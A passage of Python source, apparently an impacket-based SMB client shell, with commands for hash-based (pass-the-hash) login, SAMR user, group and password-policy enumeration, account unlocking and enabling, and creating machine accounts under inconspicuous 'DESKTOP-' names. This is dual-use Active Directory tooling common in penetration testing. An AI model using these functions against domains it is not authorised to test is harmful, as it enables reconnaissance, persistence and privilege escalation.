    complete_reset_password = complete_password
    complete_setpassword = complete_password
    complete_changepassword = complete_password

    def do_unlock(self, line):
        """unlock <username> [-d <domain>] - Unlocks a locked out user account via SAMR named pipe without changing password"""
        if not line.strip():
            print("[-] Target username required. Usage: unlock <username> [-d domain]")
            return
        self.do_password(line.strip() + " -u --no-pass")

    def help_unlock(self):
        print("""
================================================================================
SAMR User Account Unlock
================================================================================
Unlocks a locked out Active Directory or local SAM account over SMB via \\pipe\\samr.
This clears the USER_ACCOUNT_AUTO_LOCKED flag in UserAccountControl without
modifying the user's password or requiring an SMB session key.

Syntax:
  unlock <username> [-d <domain>]

Examples:
  # unlock mandiantadmin
  # unlock SCCMLAB\\mandiantadmin
  # unlock jdoe -d SCCMLAB
================================================================================
""")

    def complete_unlock(self, text, line, begidx, endidx):
        return []

    def do_enable_user(self, line):
        """enable_user <username> [-d <domain>] - Enables a disabled user account via SAMR named pipe without changing password"""
        if not line.strip():
            print("[-] Target username required. Usage: enable_user <username> [-d domain]")
            return
        self.do_password(line.strip() + " -e --no-pass")

    do_enableuser = do_enable_user

    def help_enable_user(self):
        print("""
================================================================================
SAMR User Account Enable
================================================================================
Enables a disabled Active Directory or local SAM account over SMB via \\pipe\\samr.
This clears the USER_ACCOUNT_DISABLED flag in UserAccountControl without
modifying the user's password or requiring an SMB session key.

Syntax:
  enable_user <username> [-d <domain>]

Aliases:
  enableuser

Examples:
  # enable_user mandiantadmin
  # enable_user SCCMLAB\\mandiantadmin
  # enable_user Guest -d SCCMLAB
================================================================================
""")

    help_enableuser = help_enable_user

    def complete_enable_user(self, text, line, begidx, endidx):
        return []

    complete_enableuser = complete_enable_user

    def do_open(self,line):
        l = line.split(' ')
        port = 445
        if len(l) > 0:
           host = l[0]
        if len(l) > 1:
           port = int(l[1])


        if port == 139:
            self.smb = SMBConnection('*SMBSERVER', host, sess_port=port)
        else:
            self.smb = SMBConnection(host, host, sess_port=port)

        dialect = self.smb.getDialect()
        if dialect == SMB_DIALECT:
            LOG.info("SMBv1 dialect used")
        elif dialect == SMB2_DIALECT_002:
            LOG.info("SMBv2.0 dialect used")
        elif dialect == SMB2_DIALECT_21:
            LOG.info("SMBv2.1 dialect used")
        else:
            LOG.info("SMBv3.0 dialect used")

        self.share = None
        self.tid = None
        self.pwd = ''
        self.loggedIn = False
        self.password = None
        self.lmhash = None
        self.nthash = None
        self.username = None

    def do_reconnect(self, line):
        if self.smb:
            self.smb.reconnect()
        else:
            LOG.warning("Not reconnecting a closed connection.")
    
    def do_login(self,line):
        if self.smb is None:
            LOG.error("No connection open")
            return
        l = line.split(' ')
        username = ''
        password = ''
        domain = ''
        if len(l) > 0:
           username = l[0]
        if len(l) > 1:
           password = l[1]

        if username.find('/') > 0:
           domain, username = username.split('/')

        if password == '' and username != '':
            from getpass import getpass
            password = getpass("Password:")

        self.smb.login(username, password, domain=domain)
        self.password = password
        self.username = username

        if self.smb.isGuestSession() > 0:
            LOG.info("GUEST Session Granted")
        else:
            LOG.info("USER Session Granted")
        self.loggedIn = True

    def do_kerberos_login(self,line):
        if self.smb is None:
            LOG.error("No connection open")
            return
        l = line.split(' ')
        username = ''
        password = ''
        domain = ''
        if len(l) > 0:
           username = l[0]
        if len(l) > 1:
           password = l[1]

        if username.find('/') > 0:
           domain, username = username.split('/')

        if domain == '':
            LOG.error("Domain must be specified for Kerberos login")
            return

        if password == '' and username != '':
            from getpass import getpass
            password = getpass("Password:")

        self.smb.kerberosLogin(username, password, domain=domain)
        self.password = password
        self.username = username

        if self.smb.isGuestSession() > 0:
            LOG.info("GUEST Session Granted")
        else:
            LOG.info("USER Session Granted")
        self.loggedIn = True

    def do_login_hash(self,line):
        if self.smb is None:
            LOG.error("No connection open")
            return
        l = line.split(' ')
        domain = ''
        if len(l) > 0:
           username = l[0]
        if len(l) > 1:
           hashes = l[1]
        else:
           LOG.error("Hashes needed. Format is lmhash:nthash")
           return

        if username.find('/') > 0:
           domain, username = username.split('/')

        lmhash, nthash = hashes.split(':')

        self.smb.login(username, '', domain,lmhash=lmhash, nthash=nthash)
        self.username = username
        self.lmhash = lmhash
        self.nthash = nthash

        if self.smb.isGuestSession() > 0:
            LOG.info("GUEST Session Granted")
        else:
            LOG.info("USER Session Granted")
        self.loggedIn = True

    def do_logoff(self, line):
        if self.smb is None:
            LOG.error("No connection open")
            return
        self._reset_dfs_state()
        self.smb.logoff()
        del self.smb
        self.share = None
        self.smb = None
        self.tid = None
        self.pwd = ''
        self.loggedIn = False
        self.password = None
        self.lmhash = None
        self.nthash = None
        self.username = None

    def do_info(self, line):
        if self.loggedIn is False:
            LOG.error("Not logged in")
            return
        rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename = r'\srvsvc', smb_connection = self.smb)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(srvs.MSRPC_UUID_SRVS)
        resp = srvs.hNetrServerGetInfo(dce, 102)

        print("Version Major: %d" % resp['InfoStruct']['ServerInfo102']['sv102_version_major'])
        print("Version Minor: %d" % resp['InfoStruct']['ServerInfo102']['sv102_version_minor'])
        print("Server Name: %s" % resp['InfoStruct']['ServerInfo102']['sv102_name'])
        print("Server Comment: %s" % resp['InfoStruct']['ServerInfo102']['sv102_comment'])
        print("Server UserPath: %s" % resp['InfoStruct']['ServerInfo102']['sv102_userpath'])
        print("Simultaneous Users: %d" % resp['InfoStruct']['ServerInfo102']['sv102_users'])

    def do_who(self, line):
        if self.loggedIn is False:
            LOG.error("Not logged in")
            return
        rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename = r'\srvsvc', smb_connection = self.smb)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(srvs.MSRPC_UUID_SRVS)
        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 10)

        for session in resp['InfoStruct']['SessionInfo']['Level10']['Buffer']:
            print("host: %15s, user: %5s, active: %5d, idle: %5d" % (
            session['sesi10_cname'][:-1], session['sesi10_username'][:-1], session['sesi10_time'],
            session['sesi10_idle_time']))

    @staticmethod
    def _to_int(val, default=0):
        if val is None:
            return default
        if isinstance(val, int):
            return val
        if hasattr(val, '__getitem__'):
            try:
                d = val['Data']
                if isinstance(d, int):
                    return d
                return int(d)
            except Exception:
                pass
        if hasattr(val, 'fields') and 'Data' in val.fields:
            try:
                d = val.fields['Data']
                if isinstance(d, int):
                    return d
                return int(d)
            except Exception:
                pass
        if isinstance(val, dict) and 'Data' in val:
            try:
                return int(val['Data'])
            except Exception:
                pass
        try:
            return int(val)
        except Exception:
            pass
        try:
            return int(str(val))
        except Exception:
            return default

    def _parse_large_int(self, val):
        if val is None:
            return 0
        if isinstance(val, int):
            return val
        if hasattr(val, 'fields') and 'HighPart' in val.fields and 'LowPart' in val.fields:
            low = self._to_int(val['LowPart']) & 0xffffffff
            high = self._to_int(val['HighPart'])
            return struct.unpack('<q', struct.pack('<Ii', low, high))[0]
        return self._to_int(val, 0)

    def _format_time_interval(self, val):
        raw = self._parse_large_int(val)
        if raw == 0:
            return "0 (None)"
        if raw == -9223372036854775808 or raw == 0x8000000000000000 or raw == 0x7fffffffffffffff:
            return "Never / Not Set"
        sec = abs(raw) // 10000000
        days = sec // 86400
        rem = sec % 86400
        hours = rem // 3600
        rem = rem % 3600
        mins = rem // 60
        secs = rem % 60
        parts = []
        if days > 0:
            parts.append("%d day%s" % (days, 's' if days > 1 else ''))
        if hours > 0:
            parts.append("%d hour%s" % (hours, 's' if hours > 1 else ''))
        if mins > 0:
            parts.append("%d min%s" % (mins, 's' if mins > 1 else ''))
        if secs > 0 or not parts:
            parts.append("%d sec%s" % (secs, 's' if secs > 1 else ''))
        return " ".join(parts)

    def _format_filetime(self, val):
        raw = self._parse_large_int(val)
        if raw == 0 or raw == 0x7fffffffffffffff or raw == -9223372036854775808:
            return "Never"
        try:
            unix_time = (raw - 116444736000000000) / 10000000
            return datetime.fromtimestamp(unix_time, timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
        except Exception:
            return str(raw)

    def _clean_str(self, s):
        if s is None:
            return ''
        if hasattr(s, 'fields') and 'Data' in s.fields:
            s = s['Data']
        if s is None:
            return ''
        res = str(s)
        if res.endswith('\x00'):
            res = res[:-1]
        return res

    def _connect_samr(self, targetDomain=None):
        if self.smb is None:
            print("[-] No active SMB connection")
            return None, None, None, None, None
        rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\samr', smb_connection=self.smb)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        serverHandle = samr.hSamrConnect(dce)['ServerHandle']

        resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
        domains = resp['Buffer']['Buffer']

        chosen_domain = None
        if targetDomain:
            td_short = targetDomain.split('.')[0].lower()
            for d in domains:
                if d['Name'].lower() == targetDomain.lower() or d['Name'].lower() == td_short:
                    chosen_domain = d['Name']
                    break
            if not chosen_domain:
                chosen_domain = targetDomain
        else:
            for d in domains:
                if d['Name'].lower() != 'builtin':
                    chosen_domain = d['Name']
                    break
            if not chosen_domain and domains:
                chosen_domain = domains[0]['Name']

        domainHandle = None
        domainSid = None
        if chosen_domain:
            domainSid = samr.hSamrLookupDomainInSamServer(dce, serverHandle, chosen_domain)['DomainId']
            domainHandle = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, desiredAccess=MAXIMUM_ALLOWED, domainId=domainSid)['DomainHandle']

        return dce, serverHandle, domainHandle, domainSid, chosen_domain

    def do_add_computer(self, line):
        """add_computer [computer_name] [password] - Adds a machine account to Active Directory via SAMR"""
        if self.smb is None:
            print("[-] No active SMB connection")
            return

        parts = shlex.split(line) if line else []
        computerName = None
        computerPassword = None

        if len(parts) >= 1:
            computerName = parts[0]
        if len(parts) >= 2:
            computerPassword = parts[1]

        if not computerName:
            computerName = "DESKTOP-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + "$"
        elif not computerName.endswith("$"):
            computerName += "$"

        if not computerPassword:
            computerPassword = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

        print("[*] Target machine account: %s" % computerName)
        print("[*] Target machine password: %s" % computerPassword)

        dce = None
        serverHandle = None
        domainHandle = None
        userHandle = None

        try:
            rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\samr', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp = samr.hSamrConnect(dce)
            serverHandle = resp['ServerHandle']

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp['Buffer']['Buffer']
            domainsWithoutBuiltin = [d for d in domains if d['Name'].lower() != 'builtin']
            if not domainsWithoutBuiltin:
                raise Exception("No non-Builtin domains found on SAM server")

            selectedDomain = domainsWithoutBuiltin[0]['Name']
            print("[*] Using domain: %s" % selectedDomain)

            domainSid = samr.hSamrLookupDomainInSamServer(dce, serverHandle, selectedDomain)['DomainId']
            openDomainResp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, desiredAccess=samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER, domainId=domainSid)
            domainHandle = openDomainResp['DomainHandle']

            try:
                checkUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [computerName])
                print("[-] Account %s already exists in domain!" % computerName)
                return
            except DCERPCException as e:
                if str(e).find('STATUS_NONE_MAPPED') < 0 and str(e).find('0xc0000073') < 0:
                    raise

            print("[*] Creating account %s..." % computerName)
            createUserResp = samr.hSamrCreateUser2InDomain(dce, domainHandle, computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE)
            userHandle = createUserResp['UserHandle']

            print("[*] Setting account password...")
            password_set = False
            last_err = None
            try:
                samr.hSamrSetPasswordInternal4New(dce, userHandle, computerPassword)
                password_set = True
            except Exception as e:
                last_err = e

            if not password_set:
                try:
                    samr.hSamrChangePasswordUser(dce, userHandle, '', computerPassword)
                    password_set = True
                except Exception as e:
                    last_err = e

            if not password_set:
                try:
                    samr.hSamrUnicodeChangePasswordUser2(dce, '\\\\%s\x00' % self.smb.getRemoteHost(), computerName, '', computerPassword)
                    password_set = True
                except Exception as e:
                    last_err = e

            if not password_set:
                raise Exception("Failed to set password: %s" % str(last_err))

            print("[*] Configuring UserAccountControl flags...")
            samr.hSamrCloseHandle(dce, userHandle)
            userHandle = None

            checkUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [computerName])
            userRid = 0
            try:
                userRid = self._to_int(checkUser['RelativeIds']['Element'][0]['Data'])
            except Exception:
                pass
            if not userRid:
                try:
                    userRid = self._to_int(checkUser['RelativeIds']['Element'][0])
                except Exception:
                    pass
            openUserResp = samr.hSamrOpenUser(dce, domainHandle, MAXIMUM_ALLOWED, userRid)
            userHandle = openUserResp['UserHandle']

            infoBuf = samr.SAMPR_USER_INFO_BUFFER()
            infoBuf['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
            infoBuf['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
            samr.hSamrSetInformationUser2(dce, userHandle, infoBuf)

            print("[+] Machine account '%s' created successfully!" % computerName)
            print("[+] Password: %s" % computerPassword)
            print("[+] RID: %s" % str(userRid))
            print("[+] UserAccountControl: 0x1000 (WORKSTATION_TRUST_ACCOUNT)")

        except Exception as e:
            print("[-] Error creating machine account: %s" % str(e))
        finally:
            if userHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, userHandle)
                except Exception:
                    pass
            if domainHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, domainHandle)
                except Exception:
                    pass
            if serverHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, serverHandle)
                except Exception:
                    pass
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

    def do_enum_users(self, line):
        """enum_users [domain] [-v] [username] - Enumerates domain users or displays verbose details for a user via SAMR"""
        if self.smb is None:
            print("[-] No active SMB connection")
            return

        parts = shlex.split(line) if line else []
        verbose = False
        targetDomain = None
        targetUser = None

        clean_parts = []
        for p in parts:
            if p in ('-v', '--verbose'):
                verbose = True
            else:
                clean_parts.append(p)

        dce = None
        serverHandle = None
        domainHandle = None

        try:
            rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\samr', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp = samr.hSamrConnect(dce)
            serverHandle = resp['ServerHandle']

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp['Buffer']['Buffer']
            domain_names = [d['Name'].lower() for d in domains]

            if clean_parts:
                if clean_parts[0].lower() in domain_names:
                    targetDomain = clean_parts[0]
                    if len(clean_parts) > 1:
                        targetUser = clean_parts[1]
                else:
                    targetUser = clean_parts[0]

            chosen_domain = None
            if targetDomain:
                for d in domains:
                    if d['Name'].lower() == targetDomain.lower():
                        chosen_domain = d['Name']
                        break
            if not chosen_domain:
                for d in domains:
                    if d['Name'].lower() != 'builtin':
                        chosen_domain = d['Name']
                        break
                if not chosen_domain and domains:
                    chosen_domain = domains[0]['Name']

            if not chosen_domain:
                print("[-] No domain found to query")
                return

            domainSid = samr.hSamrLookupDomainInSamServer(dce, serverHandle, chosen_domain)['DomainId']
            domainHandle = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, desiredAccess=MAXIMUM_ALLOWED, domainId=domainSid)['DomainHandle']

            if targetUser:
                print("[*] Querying user '%s' in domain '%s'..." % (targetUser, chosen_domain))
                try:
                    checkUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [targetUser])
                except DCERPCException as e:
                    if str(e).find('STATUS_NONE_MAPPED') >= 0 or str(e).find('0xc0000073') >= 0:
                        print("[-] User '%s' not found in domain '%s'" % (targetUser, chosen_domain))
                        return
                    raise

                userRid = self._to_int(checkUser['RelativeIds']['Element'][0])
                userResp = samr.hSamrOpenUser(dce, domainHandle, MAXIMUM_ALLOWED, userRid)
                uHandle = userResp['UserHandle']
                try:
                    info = samr.hSamrQueryInformationUser2(dce, uHandle, samr.USER_INFORMATION_CLASS.UserAllInformation)
                    u = info['Buffer']['All']

                    print("\n" + "=" * 65)
                    print("User Information: %s (RID: %d)" % (u['UserName'], userRid))
                    print("=" * 65)
                    print("  Account Name:              %s" % u['UserName'])
                    print("  Full Name:                 %s" % u['FullName'])
                    print("  RID:                       %d" % userRid)
                    print("  Primary Group ID:          %d" % self._to_int(u['PrimaryGroupId']))
                    print("  Account Disabled:          %s" % bool(self._to_int(u['UserAccountControl']) & samr.USER_ACCOUNT_DISABLED))
                    print("  Password Expired:          %s" % bool(u['PasswordExpired']))
                    print("  Password Does Not Expire:  %s" % bool(self._to_int(u['UserAccountControl']) & samr.USER_DONT_EXPIRE_PASSWORD))
                    print("  Password Last Set:         %s" % self._format_filetime(u['PasswordLastSet']))
                    print("  Password Must Change:      %s" % self._format_filetime(u['PasswordMustChange']))
                    print("  Password Can Change:       %s" % self._format_filetime(u['PasswordCanChange']))
                    print("  Last Logon:                %s" % self._format_filetime(u['LastLogon']))
                    print("  Last Logoff:               %s" % self._format_filetime(u['LastLogoff']))
                    print("  Bad Password Count:        %d" % self._to_int(u['BadPasswordCount']))
                    print("  Logon Count:               %d" % self._to_int(u['LogonCount']))
                    print("  User Comment:              %s" % u['UserComment'])
                    print("  Admin Comment:             %s" % u['AdminComment'])
                    print("  Script Path:               %s" % u['ScriptPath'])
                    print("  Profile Path:              %s" % u['ProfilePath'])
                    print("  Home Directory:            %s" % u['HomeDirectory'])
                    print("  Home Directory Drive:      %s" % u['HomeDirectoryDrive'])
                    print("  Workstations:              %s" % u['WorkStations'])
                    print("  UserAccountControl:        0x%08x" % self._to_int(u['UserAccountControl']))
                    print("=" * 65 + "\n")
                finally:
                    samr.hSamrCloseHandle(dce, uHandle)
            else:
                print("[*] Enumerating users in domain '%s'..." % chosen_domain)
                status = STATUS_MORE_ENTRIES
                enumerationContext = 0
                all_users = []

                while status == STATUS_MORE_ENTRIES:
                    try:
                        resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                    except DCERPCException as e:
                        if str(e).find('STATUS_MORE_ENTRIES') < 0:
                            raise
                        resp = e.get_packet()

                    if not resp['Buffer']['Buffer']:
                        break

                    for user in resp['Buffer']['Buffer']:
                        all_users.append((user['Name'], self._to_int(user['RelativeId'])))

                    enumerationContext = resp['EnumerationContext']
                    status = resp['ErrorCode']

                print("\n%-8s  %-30s  %s" % ("RID", "Username", "Status / Details" if verbose else ""))
                print("-" * (65 if verbose else 42))

                for name, rid in all_users:
                    if verbose:
                        status_flags = []
                        try:
                            uResp = samr.hSamrOpenUser(dce, domainHandle, MAXIMUM_ALLOWED, rid)
                            uH = uResp['UserHandle']
                            try:
                                uInfo = samr.hSamrQueryInformationUser2(dce, uH, samr.USER_INFORMATION_CLASS.UserAllInformation)
                                uData = uInfo['Buffer']['All']
                                uac = self._to_int(uData['UserAccountControl'])
                                if uac & samr.USER_ACCOUNT_DISABLED:
                                    status_flags.append("Disabled")
                                if uac & samr.USER_DONT_EXPIRE_PASSWORD:
                                    status_flags.append("DontExpire")
                                if uData['PasswordExpired']:
                                    status_flags.append("PwdExpired")
                                if uData['FullName']:
                                    status_flags.append("Name: %s" % uData['FullName'])
                            finally:
                                samr.hSamrCloseHandle(dce, uH)
                        except Exception:
                            pass
                        details = ", ".join(status_flags) if status_flags else "Normal"
                        print("%-8d  %-30s  %s" % (rid, name, details))
                    else:
                        print("%-8d  %-30s" % (rid, name))

                print("\n[+] Total users enumerated: %d\n" % len(all_users))

        except Exception as e:
            print("[-] Error enumerating users: %s" % str(e))
        finally:
            if domainHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, domainHandle)
                except Exception:
                    pass
            if serverHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, serverHandle)
                except Exception:
                    pass
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

    def do_enum_groups(self, line):
        """enum_groups [domain] - Enumerates domain global groups, domain aliases, and Builtin aliases via SAMR"""
        if self.smb is None:
            print("[-] No active SMB connection")
            return

        targetDomain = line.strip() if line else None
        dce = None
        serverHandle = None
        domainHandle = None
        builtinHandle = None

        try:
            rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\samr', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp = samr.hSamrConnect(dce)
            serverHandle = resp['ServerHandle']

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp['Buffer']['Buffer']

            chosen_domain = None
            if targetDomain:
                for d in domains:
                    if d['Name'].lower() == targetDomain.lower():
                        chosen_domain = d['Name']
                        break
            if not chosen_domain:
                for d in domains:
                    if d['Name'].lower() != 'builtin':
                        chosen_domain = d['Name']
                        break
                if not chosen_domain and domains:
                    chosen_domain = domains[0]['Name']

            if not chosen_domain:
                print("[-] No domain found to query")
                return

            domainSid = samr.hSamrLookupDomainInSamServer(dce, serverHandle, chosen_domain)['DomainId']
            domainHandle = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, desiredAccess=MAXIMUM_ALLOWED, domainId=domainSid)['DomainHandle']

            # 1. Enumerate Global Groups in Domain
            print("\n" + "=" * 65)
            print("Global Groups in Domain: %s" % chosen_domain)
            print("=" * 65)
            status = STATUS_MORE_ENTRIES
            enumerationContext = 0
            global_groups = []

            while status == STATUS_MORE_ENTRIES:
                try:
                    resp = samr.hSamrEnumerateGroupsInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                except DCERPCException as e:
                    if str(e).find('STATUS_MORE_ENTRIES') < 0:
                        raise
                    resp = e.get_packet()

                if not resp['Buffer']['Buffer']:
                    break

                for g in resp['Buffer']['Buffer']:
                    global_groups.append((g['Name'], self._to_int(g['RelativeId'])))

                enumerationContext = resp['EnumerationContext']
                status = resp['ErrorCode']

            for name, rid in global_groups:
                member_info = ""
                try:
                    gH = samr.hSamrOpenGroup(dce, domainHandle, MAXIMUM_ALLOWED, rid)['GroupHandle']
                    try:
                        memResp = samr.hSamrGetMembersInGroup(dce, gH)
                        member_info = "(Members: %d)" % self._to_int(memResp['Members']['MemberCount'])
                    finally:
                        samr.hSamrCloseHandle(dce, gH)
                except Exception:
                    pass
                print("  RID: %-6d  %-35s  %s" % (rid, name, member_info))
            print("  Total Global Groups: %d" % len(global_groups))

            # 2. Enumerate Domain Aliases / Local Groups
            print("\n" + "=" * 65)
            print("Domain Aliases / Local Groups: %s" % chosen_domain)
            print("=" * 65)
            status = STATUS_MORE_ENTRIES
            enumerationContext = 0
            domain_aliases = []

            while status == STATUS_MORE_ENTRIES:
                try:
                    resp = samr.hSamrEnumerateAliasesInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                except DCERPCException as e:
                    if str(e).find('STATUS_MORE_ENTRIES') < 0:
                        raise
                    resp = e.get_packet()

                if not resp['Buffer']['Buffer']:
                    break

                for a in resp['Buffer']['Buffer']:
                    domain_aliases.append((a['Name'], self._to_int(a['RelativeId'])))

                enumerationContext = resp['EnumerationContext']
                status = resp['ErrorCode']

            for name, rid in domain_aliases:
                member_info = ""
                try:
                    aH = samr.hSamrOpenAlias(dce, domainHandle, MAXIMUM_ALLOWED, rid)['AliasHandle']
                    try:
                        memResp = samr.hSamrGetMembersInAlias(dce, aH)
                        member_info = "(Members: %d)" % self._to_int(memResp['Members']['Count'])
                    finally:
                        samr.hSamrCloseHandle(dce, aH)
                except Exception:
                    pass
                print("  RID: %-6d  %-35s  %s" % (rid, name, member_info))
            print("  Total Domain Aliases: %d" % len(domain_aliases))

            # 3. Enumerate Builtin Domain Aliases
            has_builtin = any(d['Name'].lower() == 'builtin' for d in domains)
            if has_builtin:
                print("\n" + "=" * 65)
                print("Builtin Domain Aliases")
                print("=" * 65)
                try:
                    builtinSid = samr.hSamrLookupDomainInSamServer(dce, serverHandle, 'Builtin')['DomainId']
                    builtinHandle = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, desiredAccess=MAXIMUM_ALLOWED, domainId=builtinSid)['DomainHandle']

                    status = STATUS_MORE_ENTRIES
                    enumerationContext = 0
                    builtin_aliases = []

                    while status == STATUS_MORE_ENTRIES:
                        try:
                            resp = samr.hSamrEnumerateAliasesInDomain(dce, builtinHandle, enumerationContext=enumerationContext)
                        except DCERPCException as e:
                            if str(e).find('STATUS_MORE_ENTRIES') < 0:
                                raise
                            resp = e.get_packet()

                        if not resp['Buffer']['Buffer']:
                            break

                        for a in resp['Buffer']['Buffer']:
                            builtin_aliases.append((a['Name'], self._to_int(a['RelativeId'])))

                        enumerationContext = resp['EnumerationContext']
                        status = resp['ErrorCode']

                    for name, rid in builtin_aliases:
                        member_info = ""
                        try:
                            bH = samr.hSamrOpenAlias(dce, builtinHandle, MAXIMUM_ALLOWED, rid)['AliasHandle']
                            try:
                                memResp = samr.hSamrGetMembersInAlias(dce, bH)
                                member_info = "(Members: %d)" % self._to_int(memResp['Members']['Count'])
                            finally:
                                samr.hSamrCloseHandle(dce, bH)
                        except Exception:
                            pass
                        print("  RID: %-6d  %-35s  %s" % (rid, name, member_info))
                    print("  Total Builtin Aliases: %d" % len(builtin_aliases))
                except Exception as e:
                    print("  [-] Error querying Builtin domain: %s" % str(e))

            print("=" * 65 + "\n")

        except Exception as e:
            print("[-] Error enumerating groups: %s" % str(e))
        finally:
            if builtinHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, builtinHandle)
                except Exception:
                    pass
            if domainHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, domainHandle)
                except Exception:
                    pass
            if serverHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, serverHandle)
                except Exception:
                    pass
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

    def do_enum_pwpolicy(self, line):
        """enum_pwpolicy [domain] - Retrieves domain password policy and account lockout settings via SAMR"""
        if self.smb is None:
            print("[-] No active SMB connection")
            return

        targetDomain = line.strip() if line else None
        dce = None
        serverHandle = None
        domainHandle = None

        try:
            rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\samr', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp = samr.hSamrConnect(dce)
            serverHandle = resp['ServerHandle']

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp['Buffer']['Buffer']

            chosen_domain = None
            if targetDomain:
                for d in domains:
                    if d['Name'].lower() == targetDomain.lower():
                        chosen_domain = d['Name']
                        break
            if not chosen_domain:
                for d in domains:
                    if d['Name'].lower() != 'builtin':
                        chosen_domain = d['Name']
                        break
                if not chosen_domain and domains:
                    chosen_domain = domains[0]['Name']

            if not chosen_domain:
                print("[-] No domain found to query")
                return

            domainSid = samr.hSamrLookupDomainInSamServer(dce, serverHandle, chosen_domain)['DomainId']
            domainHandle = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, desiredAccess=MAXIMUM_ALLOWED, domainId=domainSid)['DomainHandle']

            # Query Password Information
            pwd_info = None
            try:
                resp = samr.hSamrQueryInformationDomain2(dce, domainHandle, samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)
                pwd_info = resp['Buffer']['Password']
            except Exception:
                resp = samr.hSamrQueryInformationDomain(dce, domainHandle, samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)
                pwd_info = resp['Buffer']['Password']

            # Query Lockout Information
            lock_info = None
            try:
                resp = samr.hSamrQueryInformationDomain2(dce, domainHandle, samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation)
                lock_info = resp['Buffer']['Lockout']
            except Exception:
                resp = samr.hSamrQueryInformationDomain(dce, domainHandle, samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation)
                lock_info = resp['Buffer']['Lockout']

            # Query General Information
            gen_info = None
            try:
                resp = samr.hSamrQueryInformationDomain2(dce, domainHandle, samr.DOMAIN_INFORMATION_CLASS.DomainGeneralInformation)
                gen_info = resp['Buffer']['General']
            except Exception:
                try:
                    resp = samr.hSamrQueryInformationDomain(dce, domainHandle, samr.DOMAIN_INFORMATION_CLASS.DomainGeneralInformation)
                    gen_info = resp['Buffer']['General']
                except Exception:
                    pass

            print("\n" + "=" * 65)
            print("Password & Account Lockout Policy: %s" % chosen_domain)
            print("=" * 65)

            if pwd_info:
                pwd_props = self._to_int(pwd_info['PasswordProperties'])
                complexity = "Enabled" if pwd_props & samr.DOMAIN_PASSWORD_COMPLEX else "Disabled"
                cleartext = "Enabled" if pwd_props & samr.DOMAIN_PASSWORD_STORE_CLEARTEXT else "Disabled"
                no_anon = "Enabled" if pwd_props & samr.DOMAIN_PASSWORD_NO_ANON_CHANGE else "Disabled"
                no_clear = "Enabled" if pwd_props & samr.DOMAIN_PASSWORD_NO_CLEAR_CHANGE else "Disabled"

                print("Password Policy:")
                print("  Minimum Password Length:       %d characters" % self._to_int(pwd_info['MinPasswordLength']))
                print("  Password History Length:       %d passwords remembered" % self._to_int(pwd_info['PasswordHistoryLength']))
                print("  Password Complexity:           %s" % complexity)
                print("  Store Cleartext Passwords:     %s" % cleartext)
                print("  Disallow Anonymous Change:     %s" % no_anon)
                print("  Disallow Cleartext Change:     %s" % no_clear)
                print("  Maximum Password Age:          %s" % self._format_time_interval(pwd_info['MaxPasswordAge']))
                print("  Minimum Password Age:          %s" % self._format_time_interval(pwd_info['MinPasswordAge']))

